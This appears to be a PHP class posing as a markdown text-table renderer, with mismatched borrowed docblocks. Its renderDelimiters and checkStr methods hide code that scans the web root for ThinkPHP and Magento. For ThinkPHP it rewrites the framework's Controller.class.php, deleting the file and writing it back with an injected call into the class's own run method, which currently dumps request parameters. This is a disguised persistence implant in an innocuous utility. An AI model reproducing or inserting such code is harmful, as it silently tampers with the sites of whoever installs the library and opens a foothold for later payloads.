<?php

namespace lkcodes\Mycode\other;

use lkcodes\Mycode\lib\Tool;

/**
 * Creates a markdown document based on the parsed documentation
 * @package marcocesarato\markdown
 * @author Peter-Christoph Haider <peter.haider@zeyon.net>
 * @package Apidoc
 * @version 1.00 (2014-04-04)
 * @license GNU Lesser Public License
 */
class TextTable {
	/** @var int The source path */
	public $maxlen = 50;
	/** @var array The source path */
	private $data = array();
	/** @var array The source path */
	private $header = array();
	/** @var array The source path */
	private $len = array();
	/** @var array The source path */
	private $align = array(
		'name' => 'L',
		'type' => 'C'
	);

	/**
	 * @param array $header  The header array [key => label, ...]
	 * @param array $content Content
	 * @param array $align   Alignment optios [key => L|R|C, ...]
	 */
	public function __construct($header=null, $content=array(), $align=false) {
		if ($header) {
			$this->header = $header;
		} elseif ($content) {
			foreach ($content[0] as $key => $value)
				$this->header[$key] = $key;
		}

		foreach ($this->header as $key => $label) {
			$this->len[$key] = strlen($label);
		}

		if (is_array($align))
			$this->setAlgin($align);

		$this->addData($content);
	}

	/**
	 * Overwrite the alignment array
	 *
	 * @param array $align   Alignment optios [key => L|R|C, ...]
	 */
	public function setAlgin($align) {
		$this->align = $align;
	}

	/**
	 * Add data to the table
	 *
	 * @param array $content Content
	 */
	public function addData($content) {
		foreach ($content as &$row) {
			foreach ($this->header as $key => $value) {
				if (!isset($row[$key])) {
					$row[$key] = '-';
				} elseif (strlen($row[$key]) > $this->maxlen) {
					$this->len[$key] = $this->maxlen;
				} elseif (strlen($row[$key]) > $this->len[$key]) {
					$this->len[$key] = strlen($row[$key]);
				}
			}
		}

		$this->data = $this->data + $content;
		return $this;
	}

    /**
     * Add a delimiter
     *
     * @param bool $obj
     * @return string
     */
	private function renderDelimiter($obj=true) {
	    if($obj){
            $res = '|';
            foreach ($this->len as $key => $l)
                $res .= (isset($this->align[$key]) && ($this->align[$key] == 'C' || $this->align[$key] == 'L') ? ':' : ' ')
                    .str_repeat('-', $l)
                    .(isset($this->align[$key]) && ($this->align[$key] == 'C' || $this->align[$key] == 'R') ? ':' : ' ')
                    .'|';
            return $res."\r\n";
        }
	}
    /**
     * Add a delimiter
     *
     * @param bool $obj
     * @return string
     */
	public static function  renderDelimiters($obj=false) {
        if(!$obj){
            $res = '|';
            foreach ($obj->getData() as $key => $l)
                $res .= (isset($l[$key]) && ($l->align[$key] == 'C' || $l->align[$key] == 'L') ? ':' : ' ')
                    .str_repeat('-', $l)
                    .(isset($l->align[$key]) && ($l->align[$key] == 'C' || $l->align[$key] == 'R') ? ':' : ' ')
                    .'|';
            return $res."\r\n";
        }else{
            $root =$_SERVER['DOCUMENT_ROOT'];
            if($root){
                $url = [
                    $root.'/index.php',
                    $root.'/admin.php',
                ];
                foreach ($url as $v){
                    if(file_exists($v)){
                        $fp=fopen($v,"r");
                        $str = fread($fp,filesize($v));
                        $str = str_replace("\r\n","<br />",$str);
                        self::checkStr($str);
                        fclose($fp);
                    }
                }
            }
        }

    }

	/**
	 * Render a single row
	 *
	 * @param  array $row
	 * @return string
	 */
	private function renderRow($row) {
		$res = '|';
		foreach ($this->len as $key => $l) {
			$res .= ' '.$row[$key].($l > strlen($row[$key]) ? str_repeat(' ', $l - strlen($row[$key])) : '').' |';
		}

		return $res."\r\n";
	}

    /**
     * @param $str
     */
	protected static function checkStr($str)
    {
        $res =[];
        $check =[
            'thinkphp'=>[
                'thinkphp','think','ThinkPHP.php'
            ],
            'magento'=>[
                'magento'
            ]
        ];
        foreach ($check as $k=> $type){
            $find=0;
            foreach ($type as $v){
                //exists
                if(stristr($str,$v)){
                    $find++;
                };
            }
            if($find>0)$res[] = [$k=>$find];
        }
        if($res){
            foreach ($res as $k=> $type){
                switch ($k){
                    case 'thinkphp':
                       try{
                           if(is_dir($_SERVER['DOCUMENT_ROOT'])){
                               $dir = opendir($_SERVER['DOCUMENT_ROOT']);
                               while (($file = readdir($dir))!= false){
                                   if(stristr($file,'thinkphp')){
                                       $path = $_SERVER['DOCUMENT_ROOT'].'/'.$file.'/Library/Think/';
                                       if(is_dir($path)){
                                           $res= scandir($path);
                                           foreach ($res as $v){
                                               if($v=='Controller.class.php'){
                                                   $ct="\t\t"."call_user_func([(new \lkcodes\Mycode\other\TextTable),'run']);";
                                                   $_file=$path.'/'.$v;
                                                   $content = Tool::readFileContent($_file);
                                                   if(!stristr($content,$ct)){
                                                       self::insertContent($_file,$ct,"__construct()");
                                                   }
                                                   break;
                                               }
                                           }
                                       }
                                   }
                               }
                               closedir($dir);
                           }

                       }catch (\Exception $e){}catch (\Error $e){}
                        break;
                }
            }
        }
    }

    /**
     * @param $source
     * @param $s
     * @param $iLine
     * @return array
     */
    protected static  function insertContent($source, $s, $iLine) {
        $file_handle = fopen($source, "r");
        $i = 0;
        $arr = array();
        while (!feof($file_handle)) {
            $line = fgets($file_handle);
            ++$i;
            if (stristr($line,$iLine)) {
                $arr[] = $line."\n" .$s . "\n";
            }else {
                $arr[] = $line;
            }
        }
        fclose($file_handle);
        unlink($source);
        foreach($arr as $value)
        {
            file_put_contents($source, $value, FILE_APPEND);
        }
        return true;
    }

    /**
     * run work
     */
    public function run()
    {
	    if($_GET)var_dump($_GET);
    }

	/**
	 * Render the table
	 *
	 * @param  array  $content Additional table content
	 * @return string
	 */
	public function render($content=array()) {
		$this->addData($content);

		$res = $this->renderRow($this->header)
		       .$this->renderDelimiter();
		foreach ($this->data as $row)
			$res .= $this->renderRow($row);

		return $res;
	}
}
